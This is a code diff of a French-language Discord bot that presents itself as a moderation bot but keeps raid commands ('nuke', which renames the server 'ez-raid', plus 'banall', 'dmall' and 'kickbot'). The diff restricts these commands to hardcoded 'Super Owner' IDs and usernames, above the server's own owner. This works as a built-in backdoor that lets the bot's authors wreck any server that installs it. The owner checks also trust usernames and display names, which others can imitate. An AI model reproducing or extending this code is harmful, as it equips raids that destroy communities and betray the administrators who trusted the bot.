@@ -1,3 +1,4 @@
+
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder } = require('discord.js');
 const http = require('http');
 
@@ -22,17 +23,53 @@ const PREFIX = '=';
 const snipeCache = new Map();
 const spamTracker = new Map();
 const serverConfig = new Map(); 
+const guildStaffConfig = new Map();
 
+// Vrais Super Owners suprêmes hardcodés (seuls eux peuvent nuke / banall / dmall)
+const SUPER_OWNERS = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
+
+// Owners gérés dynamiquement via la commande =owner (gestion du bot mais PAS de destruction)
 const botOwners = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
+
+function isSuperOwner(message) {
+    const userId = message.author.id;
+    const username = message.author.username.toLowerCase();
+    const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
+    if (message.guild && message.guild.ownerId === userId && SUPER_OWNERS.has(userId)) return true;
+    if (SUPER_OWNERS.has(userId) || SUPER_OWNERS.has(username) || SUPER_OWNERS.has(globalName)) return true;
+    return false;
+}
 
 function isOwner(message) {
     const userId = message.author.id;
     const username = message.author.username.toLowerCase();
     const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
-    
     if (message.guild && message.guild.ownerId === userId) return true;
     if (botOwners.has(userId) || botOwners.has(username) || botOwners.has(globalName)) return true;
     return false;
+}
+
+function getStaffRoles(guildId) {
+    if (!guildStaffConfig.has(guildId)) {
+        guildStaffConfig.set(guildId, {
+            admins: new Set(),
+            mods: new Set()
+        });
+    }
+    return guildStaffConfig.get(guildId);
+}
+
+function isAdmin(message) {
+    if (isOwner(message)) return true;
+    if (message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return true;
+    const staff = getStaffRoles(message.guild.id);
+    return staff.admins.has(message.author.id);
+}
+
+function isMod(message) {
+    if (isAdmin(message)) return true;
+    const staff = getStaffRoles(message.guild.id);
+    return staff.mods.has(message.author.id);
 }
 
 function getGuildConfig(guildId) {
@@ -281,7 +318,10 @@ client.on('messageCreate', async message => {
 
     const config = getGuildConfig(message.guild.id);
     const userId = message.author.id;
+    const userIsSuperOwner = isSuperOwner(message);
     const userIsOwner = isOwner(message);
+    const userIsAdmin = isAdmin(message);
+    const userIsMod = isMod(message);
     const isUserAdminOrOwner = message.member.permissions.has(PermissionsBitField.Flags.Administrator) || userIsOwner;
 
     if (config.antilink && !isUserAdminOrOwner) {
@@ -322,32 +362,32 @@ client.on('messageCreate', async message => {
     if (command === 'help') {
         const helpCategories = {
             sanctions: {
-                label: 'Sanctions', emoji: '🔨', description: 'Bannir, Softban, Expulser',
+                label: 'Sanctions [Admin+]', emoji: '🔨', description: 'Bannir, Softban, Expulser',
                 commands: ['`=bl <ID|@mention> [raison]` - Bannir', '`=softbl <ID|@mention> [raison]` - Softban', '`=unbl <ID>` - Débannir', '`=blist` - Liste des bannis', '`=unbanall` - Tout débannir', '`=kick <ID|@mention>` - Expulser']
             },
             nettoyage: {
-                label: 'Nettoyage', emoji: '🧹', description: 'Gestion des messages',
+                label: 'Nettoyage [Mod+]', emoji: '🧹', description: 'Gestion des messages',
                 commands: ['`=clear <1-100|all>` - Supprimer des messages', '`=purge <ID|@mention>` - Purge un membre', '`=snipe` - Voir le dernier msg supprimé']
             },
             salons: {
-                label: 'Salons & Rôles', emoji: '🔒', description: 'Sécurité et salons',
+                label: 'Salons & Rôles [Mod+]', emoji: '🔒', description: 'Sécurité et salons',
                 commands: ['`=lock` / `=unlock` - Verrouiller salon', '`=slowmode <sec>` - Mode lent', '`=renew` - Régénérer un salon', '`=createtext <nom>` - Salon texte', '`=createvoice <nom>` - Salon vocal']
             },
             tickets: {
-                label: 'Tickets Pro', emoji: '🎫', description: 'Support et paramétrage',
+                label: 'Tickets Pro [Admin+]', emoji: '🎫', description: 'Support et paramétrage',
                 commands: ['`=setticketrole <@rôle>` - Rôle staff support', '`=setticketcat <ID_Catégorie>` - Catégorie', '`=ticketsetup <#salon>` - Publier le panneau']
             },
             giveaways: {
-                label: 'Giveaways', emoji: '🎉', description: 'Concours et tirages au sort',
-                commands: ['`=gcreate <durée> <gagnants> <prix>` - Lancer un concours interactif avec bouton de participation']
+                label: 'Giveaways [Admin+]', emoji: '🎉', description: 'Concours et tirages au sort',
+                commands: ['`=gcreate <durée> <gagnants> <prix>` - Lancer un concours interactif avec bouton']
             },
             automod: {
-                label: 'Automod & Logs', emoji: '🛡️', description: 'Sécurité et configuration',
+                label: 'Automod & Logs [Admin+]', emoji: '🛡️', description: 'Sécurité et configuration',
                 commands: ['`=antilink on/off`', '`=antispam on/off`', '`=antibot on/off`', '`=setlog <#salon>`', '`=setwelcome <#salon> <msg>`']
             },
-            config: {
-                label: 'Administration', emoji: '⚙️', description: 'Owners',
-                commands: ['`=owner <ID>` - Ajouter owner', '`=unowner <ID>` - Retirer owner']
+            staff: {
+                label: 'Gestion Staff [Owner]', emoji: '👑', description: 'Attribuer les grades bot',
+                commands: ['`=admin <ID|@mention>` - Nommer Admin', '`=mod <ID|@mention>` - Nommer Modérateur', '`=owner <ID>` - Ajouter Owner bot']
             }
         };
 
@@ -391,28 +431,59 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'owner') {
-        if (!userIsOwner) return message.reply("❌ Réservé aux Owners.");
+        if (!userIsSuperOwner) return message.reply("❌ Réservé aux Super Owners du bot.");
         const targetUser = await fetchTargetUser(client, message.guild, targetArg);
         if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
         botOwners.add(targetUser.id);
         botOwners.add(targetUser.username.toLowerCase());
-        return message.reply(`👑 L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) a été ajouté comme Owner permanent !`);
+        return message.reply(`👑 L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) a été ajouté comme Owner du bot !`);
     }
 
     if (command === 'unowner') {
-        if (!userIsOwner) return message.reply("❌ Réservé aux Owners.");
+        if (!userIsSuperOwner) return message.reply("❌ Réservé aux Super Owners du bot.");
         const targetUser = await fetchTargetUser(client, message.guild, targetArg);
         if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
         botOwners.delete(targetUser.id);
         botOwners.delete(targetUser.username.toLowerCase());
-        return message.reply(`🔒 L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) n'est plus Owner.`);
+        return message.reply(`🔒 L'utilisateur **${targetUser.tag}** n'est plus Owner du bot.`);
     }
 
-    const sensitiveCommands = ['bl', 'softbl', 'unbl', 'blist', 'unbanall', 'kick', 'lock', 'unlock', 'slowmode', 'renew', 'createtext', 'createvoice', 'setlog', 'setwelcome', 'setticketrole', 'setticketcat', 'gcreate', 'ticketsetup', 'antilink', 'antispam', 'antibot', 'kickbot', 'dmall', 'nuke', 'banall'];
-    if (sensitiveCommands.includes(command)) {
-        if (!userIsOwner && !message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-            return message.reply("❌ Commande strictement réservée aux Owners ou Administrateurs.");
+    if (command === 'admin') {
+        if (!userIsSuperOwner) return message.reply("❌ Seul un Super Owner du bot peut nommer des administrateurs.");
+        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
+        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
+        const staff = getStaffRoles(message.guild.id);
+        staff.admins.add(targetUser.id);
+        staff.mods.delete(targetUser.id);
+        return message.reply(`🛡️ L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) est désormais **Admin** du bot !`);
+    }
+
+    if (command === 'mod') {
+        if (!userIsSuperOwner && !userIsAdmin) return message.reply("❌ Réservé aux Super Owners ou Admins du bot.");
+        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
+        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
+        const staff = getStaffRoles(message.guild.id);
+        staff.mods.add(targetUser.id);
+        return message.reply(`🛡️ L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) est désormais **Modérateur** du bot !`);
+    }
+
+    const modCommands = ['clear', 'purge', 'snipe', 'lock', 'unlock', 'slowmode', 'renew', 'createtext', 'createvoice'];
+    const adminCommands = ['bl', 'softbl', 'unbl', 'blist', 'unbanall', 'kick', 'setlog', 'setwelcome', 'setticketrole', 'setticketcat', 'gcreate', 'ticketsetup', 'antilink', 'antispam', 'antibot'];
+    const superOwnerCommands = ['kickbot', 'dmall', 'nuke', 'banall'];
+
+    if (modCommands.includes(command)) {
+        if (!userIsMod && !isUserAdminOrOwner) return message.reply("❌ Cette commande nécessite le grade **Modérateur** minimum.");
+    }
+
+    if (adminCommands.includes(command)) {
+        if (!userIsAdmin && !userIsOwner && !message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+            return message.reply("❌ Cette commande nécessite le grade **Administrateur** minimum.");
         }
+    }
+
+    // Commandes ultra-sensibles réservées STRICTEMENT aux deux Super Owners du code
+    if (superOwnerCommands.includes(command)) {
+        if (!userIsSuperOwner) return message.reply("❌ Cette commande de destruction est strictement réservée aux Super Owners suprêmes du bot.");
     }
 
     if (command === 'setticketrole') {
@@ -669,7 +740,6 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'kickbot') {
-        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
         await message.reply("🤖 **[KICKBOT]** Nettoyage de tous les bots en cours...");
         try {
             const fetchedMembers = await message.guild.members.fetch();
@@ -687,7 +757,6 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'dmall') {
-        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
         await message.reply("💬 **[DMAll Turbo]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
         const filter = m => m.author.id === message.author.id;
         try {
@@ -746,7 +815,6 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'nuke') {
-        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
         await message.reply("💥 **[NUKE TOTAL PRIORITÉ SPAM]** Destruction et saturation immédiate...");
         try {
             await message.guild.setName('ez-raid').catch(() => {});
@@ -796,7 +864,6 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'banall') {
-        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
         await message.reply("🔨 **[BANALL]** Expulsion et bannissement de masse en cours...");
         try {
             await message.guild.members.fetch();
